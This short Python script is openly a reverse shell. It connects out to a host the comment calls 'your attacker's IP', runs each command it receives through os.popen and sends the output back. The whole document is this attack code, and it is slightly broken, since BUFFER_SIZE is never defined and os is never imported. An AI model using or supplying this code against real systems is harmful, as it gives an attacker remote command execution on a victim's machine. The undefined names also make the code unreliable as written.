import socket

CLIENT_HOST = "10.224.0.5"  # Replace with your attacker's IP
CLIENT_PORT = 8888

# Create a socket object
s = socket.socket()

# Connect to the server
s.connect((CLIENT_HOST, CLIENT_PORT))

# Receive commands from the server and execute them
while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    output = os.popen(command).read()
    s.send(output.encode())

# Close the connection
s.close()
